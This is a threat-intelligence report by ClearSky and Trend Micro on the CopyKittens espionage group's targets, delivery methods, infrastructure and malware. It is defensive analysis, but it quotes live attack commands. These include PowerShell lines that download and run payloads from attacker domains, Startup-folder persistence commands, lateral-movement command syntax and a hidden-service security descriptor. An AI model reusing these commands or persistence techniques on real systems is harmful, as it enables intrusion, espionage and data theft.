Introduction
CopyKittens is a cyberespionage group that has been operating since at least 2013. In November 2015,
ClearSky and Minerva Labs published1 the first public report exposing its activity. In March 2017, ClearSky
published a second report2 exposing further incidents, some of which impacted the German Bundestag. In this
report, Trend Micro and ClearSky expose a vast espionage apparatus spanning the entire time the group has
been active. It includes recent incidents as well as older ones that have not been publicly reported; new
malware; exploitation, delivery and command and control infrastructure; and the group's modus operandi.
We dubbed this activity Operation Wilted Tulip

Targetting
CopyKittens is an active cyber espionage actor whose primary focus appears to be foreign espionage on
strategic targets. Its main targets are in countries such as Israel, Saudi Arabia, Turkey, The United States,
Jordan, and Germany. Occasionally individuals in other countries are targeted as well as UN employees.
Targeted organizations include government institutions (such as Ministry of Foreign Affairs), academic
institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large
IT companies. Online news outlets and general websites were breached and weaponized as a vehicle for
watering hole attacks.
For example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign
Affairs in the Turkish Republic of Northern Cyprus, trying to infect multiple targets in other government
organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign
affairs was used as decoy. In other cases, Israeli embassies were targeted, as well as foreign embassies in
Israel.
Victims are targeted by watering hole attacks, and emails with links to malicious websites or with malicious
attachments. Fake Facebook profiles have been used for spreading malicious links and building trust with
targets. Some of the profiles have been active for years.

Malware
CopyKittens use several self-developed malware and hacking tools that have not been publicly reported to
date, and are analyzed in this report: TDTESS backdoor; Vminst, a lateral movement tool; NetSrv, a Cobalt
Strike loader; and ZPP, a files compression console program. The group also uses Matryoshka v1, a selfdeveloped RAT analyzed by ClearSky in the 2015 report, and Matryoshka v2 which is a new version, albeit with
similar functionality.
The group often uses the trial version of Cobalt Strike3, a publicly available commercial software for "Adversary
Simulations and Red Team Operations." Other public tools used by the group are Metasploit, a well-known
free and open source framework for developing and executing exploit code against a remote target machine;
Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, "a PowerShell and Python
post-exploitation agent." For detection and exploitation of internet-facing web servers, CopyKittens use Havij,
Acunetix and sqlmap.
A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and
for data exfiltration. This feature is available both in Cobalt Strike and in Matryoshka.
Most of the infrastructure used by the group is in the U.S., Russia, and The Netherlands. Some of it has been
in use for more than two years.

Targeting
Based on Trend Micro Telemetry, incident response engagements, and open source threat intelligence
investigations, we have learned of CopyKittens target organizations and countries. Its main targets are in
countries such as Israel, Saudi Arabia, Turkey, The United States, Jordan, and Germany. Occasionally
individuals in other countries are targeted as well as UN employees.
Targeted organizations include government institutions (such as Ministry of Foreign Affairs), academic
institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large
IT companies. Online news outlets and general websites were breached and weaponized as a vehicle for
watering hole attacks.
For example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign
Affairs in the Turkish Republic of Northern Cyprus, trying to infect multiple targets in other government
organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign
affairs was used as decoy. In other cases, Israeli embassies were targeted, as well as foreign embassies in
Israel.
Based on the size of the attack infrastructure and length of the campaign, we estimate that there have been
at least a few hundred people infected in multiple organizations in the targeted countries.
After infecting a computer within a target organization, the attacker would move latterly using one of the
malware descried in chapter "Malware." It seems that their objective is to gather as much information and
data from target organizations as possible. They would indiscriminately exfiltrate large amounts of documents,
spreadsheets, file containing personal data, configuration files and databases.
In at least one case, the attackers breached an IT company, and used VPN access it had to client organizations
to breach their networks.
Often, victim organizations would learn of the breach due to the non-stealthy behavior of the attackers. The
attackers would "get greedy," infecting multiple computers within the network of breached organizations. This
would raise an alarm in various defense systems, making the victims initiate incident response operations.

Delivery and Infection
CopyKittens attack their targets using the following methods:
•

Watering hole attacks – inserting malicious JavaScript code into breached strategic websites.

•

Web based exploitation – emailing links to websites built by the attackers and containing known
exploits.

•

Malicious documents – email attachments containing weaponized Microsoft Office documents.

•

Fake social media entities – fake personal and organizational Facebook pages are used for interaction
with targets and for information gathering.

•

Web hacking – Havij, Acuntix and sqlmap are used to detect and exploit internet-facing web servers.

These methods are elaborated below.

Watering Hole Attacks
On 30 March 2017, ClearSky reported a breach of multiple websites, such as Jerusalem Post, Maariv news and
the IDF Disabled Veterans Organization website.4 JavaScript code was inserted into the breached websites,
loading BeEF (Browser Exploitation Framework) from domains owned by the attackers .5 For example:

Malicious code added to Maariv website

The malicious code was loaded from one of the following addresses:
https://js.jguery[.]net/jquery.min.js
https://js.jguery[.]online/jgueryui.min.js
This would enable the attackers to perform actions such as browser fingerprinting and information gathering,
social engineering attacks (like asking for credentials, redirect to another page, asking the user to install a
malicious extension or malware), network reconnaissance, infecting the computer using Metasploit exploits,
and more.6 The malicious code was served only when specific targets visited the website, likely based on IP
whitelisting.
Notably, prior to that publication, the German Federal Office for Information Security (BSI) said in a statement
that it had investigated "problems in network traffic" of the German Bundestag.7 The statement concluded
that the website of Israeli newspaper Jerusalem Post was manipulated and linked to a harmful third party in
January 2017.

Web-Based Exploitation
In two incidents, the attackers breached the mailbox of a person related to a target organization. From this
(real) account, they replied to previous correspondences with these organizations, adding a malicious link to
a website registered and built by attackers: primeminister-goverment-techcenter].[tech. 8
JavaScript code, at least parts of which were copied from public sources, fingerprinted the visitor's web
browser.9 This was likely used for later browser exploitation with known vulnerabilities.
In some pages the code enumerates and collects a list of installed browser plugins, in others it tries to detect
the real IP of the computer:

Browser Plugins enumeration via JavaScipt code

Internal IP detection with Java

The data is sent to the attackers, and the victim is redirected to https://akamitechnology[.]com/.

JavaScript and Java code loaded into webpage, victim is redirected after 20 seconds

Malicious Documents
The attackers use three document based exploitation types: exploiting CVE-2017-0199, embedding OLE
objects, and macros. If the victim opens a document and the exploitation is successful (in the latter two, user
interaction might be required), the attackers would receive access to the computer via self-developed or
publicly available malware (see "Malware" chapter for more details).

Exploiting CVE-2017-0199
On 26 April 2017, a malicious email was sent from an employee account that was likely breached within the
Ministry of Northern Cyprus. It was sent to a disclosed recipients list in government institutions in several
countries and other organizations, mostly in or related to ministries of foreign affairs. We should note,
however, that it is possible that the attackers were interested only in a few of the recipient organizations, but
sent it to a wider list because they showed up in previous correspondences in the breached account.
Recipients were in the following domains:
mofa.gov.vn
mfa.gov.sg
mfa.gov.tr
post.mfa.uz
mfa.am
mfa.gov.by
beijing.mfa.gov.il

Cyprus

Attached to it was a document named "IRAN_NORTH-KOREA_Russia 20170420.docx".11

Content of the malicious document

The document exploited CVE-2017-0199, downloading an rtf file from:

Embedded OLE Objects
In February 2017 a document titled "ssl.docx" was delivered to targets, likely via email.14 It asked the recipient
to "Please Update Your VPN Client from This Manual" [sic].

Content of the malicious document asking the victim to update the VPN Client

The "VPN Client manual" was an embedded OLE binary object, an executable with a reverse file extension:
checkpointsslvpn?fdp.exe. 15 (The "?" stands for an invisible Unicode character that flips the direction of the
string, making it look like a PDF file "exe.pdf.")16 It was composed of two files: a self-extracting executable and
a PDF.

Bundled executable and PDF files

They run via the following command:
cmd.exe /c copy zWEC.tmp %userprofile%\desktop\Maariv_Tops.pdf&&copy Ma_1.tmp
"%userprofile%\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup"\sourcefire.pif&&cd %userprofile%\desktop&&Maariv_Tops.pdf
The PDF file is a decoy displayed to the victim during infection. It contains content copied on March 2017 from
the public website of Maariv, a major Israeli news outlet.

Copykittens have used this this method before, for example in a document named "mfaformann?fdp.exe"

The self-extracting executable contains another executable, named p.exe, which was digitally signed with a
stolen certificate of a legitimate company called AI Squared.

Digital signature of p.exe

Interestingly, this digital certificate was used by a threat group called Oilrig.17 This might indicate the two
groups share resources or otherwise collaborate in their activity.

The self-extracting executable serves as a downloader, running the following command:
cmd.exe /c powershell.exe -nop -w hidden -c "((new-object
net.webclient).downloadstring('http://jpsrv-java-jdkec2.javaupdate[.]co:80/JPOST'))"
The C&C server sends back a short PowerShell code that loads a Cobalt Strike stager into memory.

Both the docx and the executable contained the name shiranz in their metadata or file paths:
LastModifiedBy shiranz
C:\Users\shiranz\Desktop\checkpointsslvpn?fdp.exe
C:\Users\shiranz\AppData\Local\Temp\checkpointsslvpn?fdp.exe

In another sample, the decoy document was in Turkish, indicating the target's nationality.18 This document
was likely stolen from the Turkish Ministry of Foreign Affairs: test_fdp.exe.19

Decoy document in Turkish

While the decoy PDF document is opened, the following commands are executed:
cmd.exe /c copy Ma_1.tmp "%userprofile%\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup"\CheckpointGO.pif&& copy sslvpn.tmp
%userprofile%\desktop\sslvpnmanual.pdf&& cd %userprofile%\desktop&& sslvpnmanual.pdf
cmd.exe /c powershell.exe -nop -w hidden -c "IEX ((new-object

Malicious Macros
In October 2016, the attackers uploaded to VirusTotal multiple files containing macros, likely to learn if they
are detected by antivirus engines.
For example, "Date.dotm" contains this default Word template content:20

A default template of a Word document used as decoy

The macro runs a Cobalt Strike stager that communicates with wk-in-f104.1c100.n.microsoft-security[.]host .
The attackers also uploaded an executable files that would run a Word document with content in Hebrew.21

Hebrew decoy document

The word document contains a macro that runs the following command:
cmd.exe /c powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object
System.Net.WebClient).DownloadFile('http://pht.is.nlb-deploy.edge-dyn.e11.f20.ads-youtube.
online/winini.exe','%TEMP%\XU.exe');&start %TEMP%\XU.exe& exit
In parallel, the executable drops d5tjo.exe, which is the legitimate Madshi debugging tool 2223

Fake Social Media Entities
Back in 2013, CopyKittens used several Facebook profiles to spread links to a website impersonating Haaretz
news, an Israeli newspaper. In the screenshot below you can see the fake profile linking to haarettz.co[.]il
(note the extra t in the domain).
"Erick Brown"24

Who in turn tagged another fake Israeli profile as her cousin “‫”גסיקה כהן‬27

Fake profile "‫"גסיקה כהן‬

While "Erik Brown" has not been publicly active since September 2015, and the two other Israeli profiles have
not been publicly active since September 2013, Amanda Morgan is still active to date. She has thousands of
friends and 2,630 followers, many of which are Israeli. In 2015 she sent her friends an invitation to Like a
Facebook page: "Emet press."

Amanda Morgan invites its friends to like "Emet press"

Emet press (Emet means "truth" in Hebrew), is described as a non-biased news aggregator operated by Israeli
students aboard. However, the Hebrew text is clearly not written by someone who speaks Hebrew as a first
language:

The page re-posted news stories in Hebrew copied from online news outlets until August 2016. 28 An
accompanying website with similar content was published in www.emetpress[.]com.

Emet press website

Neither the Facebook page nor website have been used to spread malicious or fake content publicly. We
estimate that they were used to build trust with targets, and potentially send malicious content in private
messages, however we do not have evidence of such activity.
Looking at the website source code reveals that it was built with NovinWebGostar, a website building platform.

Web Hacking
Based on logs from internet-facing web servers in target organizations, we have detected that CopyKittens use
the following tools for web vulnerability scanning and SQL Injection exploitation.
Havij: "An automatic SQL Injection tool, [which is] distributed by ITSecTeam, an Iranian security company."29
Havij is freely distributed and has a graphical user interface. It is commonly used for automated SQL Injection
and vulnerability assessments.
sqlmap: An "automatic SQL Injection and database takeover tool."30 sqlmap is an open source penetration
testing tool that automates the process of detecting and exploiting SQL Injection flaws and taking over
database servers. It is capable of database fingerprinting, data fetching from the database, and accessing the
underlying file system and executing commands on the operating system via out-of-band connections.
Acunetix: A commercial vulnerability scanner. "Acunetix tests for SQL Injection, XSS, XXE, SSRF, Host Header
Injection and over 3000 other web vulnerabilities."31

Noteworthy observations about the domains:
• Domains impersonate one of four categories:
▪ Major internet and software companies and services – Microsoft, Google, Akamai, Cloudflare,
Amazon, Oracle, Facebook, Cisco, Twitter, Intel
▪ Security companies and products – Trend Micro, McAfee, Microsoft Defender, and potentially
Cellebrite
▪ Israeli organizations of interest to the victim – News originations, Israeli Prime Minister Office,
an Israeli ISP
▪ Other organizations or generic web services
• The attackers always use Whoisguard for Whois details protection.33
• Domains are usually registered in bulk every few months.
• Long subdomains are created like those used by Content Delivery Networks. For example:
wk-in-f104.1e100.n.microsoft-security[.]host
ns1.static.dyn-usr.gsrv01.ssl-gstatic[.]online
c20.jdk.cdn-external-ie.1e100.alkamaihd[.]net

be-5-0-ibr01-lts-ntwk-msn.alkamaihd[.]com
a17-h16.g11.iad17.as.pht-external.c15.qoldenlines[.]net
• Some of the domains have been in use for more than two years.

Often the attackers would point malicious domains to IPs not in their control. For example, as can be seen in
the screenshot below from PassiveTotal, multiple domains and hosts (marked red) were pointed to a nonmalicious IP owned by Google.3435

Multiple domains and hosts pointing to a non-malicious IP owned by Google

This pattern was instrumental for us in pivoting and detecting further malicious domains.

Malware
In this chapter we analyze and review malware used by CopyKittens.

TDTESS Backdoor
TDTESS (22fd59c534b9b8f5cd69e967cc51de098627b582) is 64-bit .NET binary backdoor that provides a
reverse shell with an option to download and execute files. It routinely calls in to the command and control
server for new instructions using basic authentication. Commands are sent via a web page. The malware
creates a stealth service, which will not show on the service manager or other tools that enumerate services
from WINAPI or Windows Management Instrumentation.

Installation and removal
TDTESS can run as either an interactive or non-interactive (service) program. When called interactively, it
receives one of the two arguments: installtheservice to install itself or uninstalltheservice to remove itself. The
arguments are described below:
installtheservice
If running with administrator privileges, it will install a service with the following characteristics:
Key name: bmwappushservice
Display name: bmwappushsvc
Description: WAP Push Message Routing Service
Type: own (runs in its own process)
Start type: auto (starts each time the computer is restarted and runs even if no one logs on to the
computer)
Path: <main executable path> (In our analysis: c:\Users\PC008\Desktop\t.exe)
Security descriptor:
D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLC
SWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;F
A;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

Service information from command-line using sc tool

The hardcoded security descriptor used to create the service is a persistence technique. Interactive users, even
if they are administrators, cannot stop or even see the service in services.msc snap-in.

Page 27 of 48
©All rights reserved to ClearSky cyber security and Trend Micro, 2017

Following is a list of denied commands:
service_change_config
service_query_status
service_stop
service_pause_continue
delete

Service information in Registry

Two log files are created during the service installation, but deleted by the program. Following is their
recovered content:

InstallUtil.InstallLog

<filename>.t.InstallLog

After creating the service, it will update the file creation time to that of the following file:
%windir%\system32\svchost.exe

Page 28 of 48
©All rights reserved to ClearSky cyber security and Trend Micro, 2017

uninstalltheservice
If running with administrator privileges, it will uninstall the said service, create log files and then deletes them.

InstallUtil.InstallLog

<filename>.t.InstallLog

Because the service installing mechanism appears to be default for .NET programs, the creator of the tool
deletes the log files right after they are created.
If no argument is given when called interactively, the program terminates itself.

Functionality
The service is started immediately after installation. After five minutes, it verifies internet connectivity by
making a HTTP HEAD request to microsoft.com.
Then it tries to access the C&C servers looking for commands.

Hardcoded HTTP parameters and URL

As a reply, TDTESS expects one of the following Bas64 encoded commands:
getnrun - download and execute a file. Parameters are drop, drop_path and t.
runnreport - send information about the computer. Parameters are cmd and boss.
wait - time to next interval to get data.

Vminst for Lateral Movement
Vminst (a60a32f21ac1a2ec33135a650aa8dc71) is a lateral movement tool used to infect hosts in the network
using previously stolen credentials. It Injects Cobalt Strike into memory of infected hosts.
The binary implements ServiceMain and is intended to be installed as a service named “sdrsrv.” When it
functions as a service, it injects Cobalt Strike beacon into its own process (which is 32-bit “svchost”) or creates
a new 32-bit “rundll32” process and injects the beacon into the new process. The injection method depends
on the parameter received when the service was created.
It is configured to open a new “rundll32” process in suspend-mode and create a remote thread which executes
a Cobalt Strike beacon or shellcode.
The binary has the option to run and load itself in memory. It also has the option to be executed through its
exported function "v," which gets a base64 string parameter built as follows:
Base-64-Encode(“/mv /OptionalCommand”)
OptionalCommand can be one of the following:
•

help - prints usage instructions:

•

[*] /help V160\n
Get : Create Service and run beacon over self thread\n
[*] /get ip (use current token)\n
[*] /get ip domain user pass\n
[*] /get ip user pass\n
New : Create Service and run beacon over new rundll32.exe thread\n
[*] /new ip (use current token)\n
[*] /new ip domain user pass\n
[*] /new ip user pass\n
[*] /new ip user pass\n
Del : Delete service and related dlls from remote host
[*] /del ip domain user pass\n
[*] /del ip user pass\n
[*] /del ip\n
Run : Run a new beacon !\n
[*] /run [no arguments]
del - stops and deletes the service “sdrsrv,” and deletes the following files:

•

\\ [IP or computer name (Can be Localhost)]\C$\Users\public\vminst.tmp
\\ [IP or computer name (Can be Localhost)]\C$\Windows\Temp\vminst.tmp
\\ [IP or computer name (Can be Localhost)]\C$\Windows\vminst.tmp
scan - sends “[ok]” to the parent of its parent process.

•

info - sends “[ok]” to the parent of its parent process.

•

run - injects a beacon into a new “rundll32” process.

•

get - gets an IP address, installs and starts the “sdrsrv” service in the remote hosts.

•

new - gets IP address, deletes the old vminst from install path, and installs the “sdrsrv” service in the
remote hosts. Then, starts the service with parameter “NEW_THREAD” that runs the service. This
command is likely used for updating the implant.

The attacker uses vminst.tmp to spread across the organization. Using the command “rundll32 vminst.tmp,v
/mv /get ip-segment credentials” it enumerates the segments and tries to connect to the hosts through SMB
(“GetFileAttributes” to network path), installing the “sdrsrv” service in each host it can access.

NetSrv – Cobalt Strike Loader
NetSrv (efca6664ad6d29d2df5aaecf99024892) loads Cobalt Strike beacons and shellcodes in infected
computers.
The binary implements ServiceMain, intended to be installed as a service named “netsrv.” When it functions
as a service, it is configured to open a new “rundll32” process in suspend-mode and create a remote thread
that executes a Cobalt Strike beacon or shellcode.
The binary also has the option to be executed with parameters that determine what it will inject into the
“rundll32” process. The command-line is as follows:
netsrv.exe /managed /ModuleToInject
The ModuleToInject can be one of these options:
sbdns
slbdnsk1
slbdnsn1
slbsbmn1
slbsmbk1
Each of these options injects a Cobalt Strike beacon or shellcode into the “rundll32” process.

Matryoshka v1 – RAT
Matryoshka v1 is a RAT analyzed in the 2015 report by ClearSky and Minerva.38 It uses DNS for command and
control communication, and has common RAT capabilities such as stealing Outlook passwords, screen
grabbing, keylogging, collecting and uploading files, and giving the attacker Meterpreter shell access. We have
seen this version of Matreyoshka in the wild from July 2016 until January 2017.
The Matryoshka.Reflective_Loader injects the module Matryoshka.Rat, which has the same persistence keys
and communication method described in the original report.

Matreyoshka v2 – RAT
Matryoshka v2 (bd38cab32b3b8b64e5d5d3df36f7c55a) is mostly like Matreyoshka v1 but has fewer
commands and a few other minor changes. Upon starting it will inject the communication module
to all available processes (with the same run architecture and the same or lower level of permission).
The inner name of Svchost’s is Injector.dll. The next stage, in memory, is ReflectiveDLL.dll. The ReflectiveDLL.dll
provides persistence via a schedule task and checks that the stager, Injector.dll, exist on disk.
ReflectiveDLL.dll gets commands via the following DNS resolutions:

ZPP – File Compressor
ZPP (bcae706c00e07936fc41ac47d671fc40) is a .NET console program that compresses files with the ZIP
algorithm. It can transfer compressed files to a remote network share.
Command line options are as follows:
-I - File extension to compress (i.e.: .txt)
-s - Source directory
-d - Destination directory
-gt - Greater than creation timestamp
-lt - Lower than creation timestamp
-mb - Unimplemented
-o - Output file name
-e - File extension to skip (except)

ZPP

ZPP will recursively read all files in the source directory to compress them with the maximum compression
rate if their names match the extension pattern given (-i). The compressed ZIP file is written to the output
directory (-d). If no output file name is set, ZPP will use the mask zpp<random_number>.out. <file_number>.
For example:

Filename is zpp5077.out0

The file compilation timestamp is Tue, 05 Jul 2016 17:22:59 UTC.
ad09feb76709b825569d9c263dfdaaac is a previous version (compilation timestamp: Sat, 09 Jan 2016 17:02:38
UTC) and is only different in that it accepts the –e switch, which ignored by the program logic.
214be584ff88fb9c44676c1d3afd7c95 is the newest version (compilation timestamp: Mon, 26 Sep 2016
19:49:34 UTC). It is supposed to implement the –s switch but although it is set when the user gives it to the
program, the switch is ignored by the code.

ZPP version 2.0

ZPP seems to be under development. All versions have bugs.
It uses the reduced version of DotNetZip library. 39 Therefore, it requires Ionic.Zip.Reduced.dll
(7c359500407dd393a276010ab778d5af) to be under the same directory or %PATH%.
Function doCompressInNetWorkDirectory() is intended to exfiltrate date from a target machine to a network
share.

Cobalt Strike
Cobalt Strike is a publicly available commercial software for "Adversary Simulations and Red Team
Operations."40 While not malicious in and of itself, it is often used by cybercrime groups and state-sponsored
threat groups, due to its post-exploitation and covert communication capabilities. 41 4243 44
CopyKittens use the free 21-day trial version of Cobalt Strike. Thus, malicious communication generated by
the tool is much easier to detect, because a special header is sent in each HTTP GET transaction. The special
header is "X-Malware," i.e. there is a literal indication that "this network communication is malicious." All that

defender need to do to detect infections is to look for this header in network traffic. Other "tells" are
implemented in the trail version.45
CopyKittens often use Cobalt Strike's DNS based command and control capability.46 Other capabilities include
PowerShell scripts execution, keystrokes logging, taking screenshots, file downloads, spawning other payloads,
and peer-to-peer communication over the SMB.

Persistency
The attackers used a novel way for persistency of Cobalt Strike samples in certain machine – a scheduled task
was written directly to the registry.
The malware creates a PowerShell wrapper, which executes powershell.exe to run scripts. The wrapper is
copied to %windir% with one of the following names:
svchost.exe
csrss.exe
notpad.exe (note missing e)
conhost.exe
The scheduled tasks are saved in the following registry path:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks
With the following attributes:
"Path"="\\Microsoft\\Windows\\Media Center\\ConfigureLocalTimeService"
"Description"="Media Center Time Update From Computer Local Time."
"Actions"=hex:01,00,66,66,00,00,00,00,2c,00,00,00,43,00,3a,00,5c,00,57,00,69,\

[…]
The hex code in the Actions attribute is converted into the following command line action:
C:\Windows\svchost.exe -nop -w hidden -encodedcommand JABzAD0ATgBl[…]
The executed command is a base64 encoded PowerShell cobalt strike stager.
The task does not have a name attribute and it does not appear in windows scheduled task viewers. The
installation methods of this persistency method is unknown to us.

Metasploit
A well-known free and open source framework for developing and executing exploit code against a remote
target machine.47 It has more than 1,610 exploits, as well as more than 438 payloads, which include command
shell that enables users to run collection scripts or arbitrary commands against the host. Meterpreter, which
enables users to control the screen of a device using VNC and to browse, upload and download files. It also
employs dynamic payloads that enables users to evade antivirus defenses by generating unique payloads.48

Empire Post-exploitation Framework
In several occasions the attackers used Empire, a free and open source "post-exploitation framework that
includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.49 The framework
offers cryptologically-secure communications and a flexible architecture. On the PowerShell side, Empire
implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable postexploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network
detection, all wrapped up in a usability-focused framework."
